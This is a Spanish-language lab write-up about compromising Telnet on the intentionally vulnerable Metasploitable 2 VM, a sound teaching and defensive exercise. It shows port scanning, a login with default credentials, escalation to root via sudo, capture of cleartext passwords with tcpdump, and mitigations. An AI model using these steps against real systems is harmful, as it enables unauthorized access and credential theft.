# ✅ Acceso Remoto por Telnet y Sniffing de Credenciales

**Objetivo:** Metasploitable 2  
**Servicio:** Telnet (TCP/23)  
**Tipo de ataque:** Acceso inicial + Exposición de credenciales + Escalada de privilegios  
**Dificultad:** Principiante  
**Estado:** Sistema completamente comprometido  

---

## 📌 Visión General

Este laboratorio demuestra cómo un atacante puede obtener **acceso no autorizado** a un sistema que ejecuta **Telnet**, robar credenciales en **texto claro** a través de la red y escalar privilegios hasta obtener **control total del sistema**.

Telnet es un protocolo **obsoleto** que transmite todos los datos —incluidos usuarios y contraseñas— **sin cifrar**, lo que lo hace extremadamente vulnerable.

---

## 🔎 1. Descubrimiento del Servicio

### 🔹 Escaneo inicial de puertos

```bash
nmap 192.168.56.101
````

**Resultado (extracto):**

```text
23/tcp  open  telnet
```

### 🔹 Detección de versión

```bash
nmap -sV -p 23 192.168.56.101
```

**Resultado:**

```text
23/tcp open telnet  Linux telnetd
```

✅ Telnet está activo y aceptando conexiones remotas.

---

## 🏁 2. Acceso Manual vía Telnet

### 🔹 Intento de conexión

```bash
telnet 192.168.56.101
```

El servicio solicita credenciales:

```text
login:
password:
```

Metasploitable 2 utiliza credenciales por defecto:

```text
Usuario: msfadmin
Contraseña: msfadmin
```

Tras iniciar sesión:

```bash
whoami
```

**Salida:**

```text
msfadmin
```

✅ Se obtiene una shell remota como un usuario válido del sistema.

---

## 🚨 Vulnerabilidad Explotada

* El protocolo transmite todos los datos en **texto plano**
* Uso de **credenciales por defecto**
* Sin restricciones de acceso
* Sin cifrado ni endurecimiento de autenticación

Esto representa una **configuración insegura realista**, común en entornos legacy.

---

## 🎯 3. Escalada de Privilegios

### 🔹 Comprobación de permisos sudo

```bash
sudo -l
```

**Salida típica en Metasploitable 2:**

```text
(ALL) ALL
```

### 🔹 Escalada a root

```bash
sudo su
```

Introducir contraseña:

```text
msfadmin
```

### 🔹 Verificación

```bash
whoami
```

```text
root
```

✅ Compromiso total del sistema.

---

## 🕵️ 4. Sniffing de Credenciales (Sin Iniciar Sesión)

Un atacante en la **misma red** puede robar credenciales Telnet **sin interactuar directamente** con la víctima, utilizando sniffing pasivo.

### 🔹 Iniciar captura en la máquina atacante (Kali)

```bash
sudo tcpdump -i eth0 -A port 23
```

A continuación, se realiza un inicio de sesión Telnet desde otra terminal o máquina.

### 🔹 Credenciales capturadas

```text
login: msfadmin
password: msfadmin
```

✅ Se demuestra que Telnet expone credenciales en **texto claro**.

### ❗ Por qué esto es crítico

* No se requieren exploits
* No se requiere autenticación previa
* Ataque sigiloso
* Facilita compromisos posteriores del sistema

---

## 💥 Impacto

| Categoría          | Riesgo                                           |
| ------------------ | ------------------------------------------------ |
| Confidencialidad   | Credenciales expuestas                           |
| Integridad         | El atacante puede modificar archivos del sistema |
| Disponibilidad     | Acceso root permite interrupciones               |
| Movimiento lateral | Credenciales reutilizables en otros servicios    |
| Persistencia       | Posibilidad de crear backdoors                   |

**Resultado final:** el atacante obtiene **control completo del sistema**.

---

## 🔧 5. Mitigación

✅ Deshabilitar Telnet completamente
✅ Sustituirlo por SSH
✅ Eliminar credenciales por defecto
✅ Forzar contraseñas fuertes y MFA
✅ Restringir el acceso remoto mediante firewall
✅ Implementar segmentación de red
✅ Monitorizar logs y detectar accesos sospechosos

En entornos modernos, **Telnet nunca debería usarse ni exponerse**.

---

## 📚 Lecciones Clave

* Las **malas configuraciones** suelen ser más peligrosas que los exploits
* Los protocolos en texto claro son un **riesgo crítico**
* Un atacante puede comprometer un sistema sin “romper” contraseñas
* La escalada de privilegios convierte el “acceso” en “propiedad”

---

## ✅ Habilidades Demostradas

* Enumeración de red
* Evaluación de servicios
* Explotación manual
* Sniffing de credenciales
* Escalada de privilegios
* Análisis de impacto
* Planificación de mitigaciones

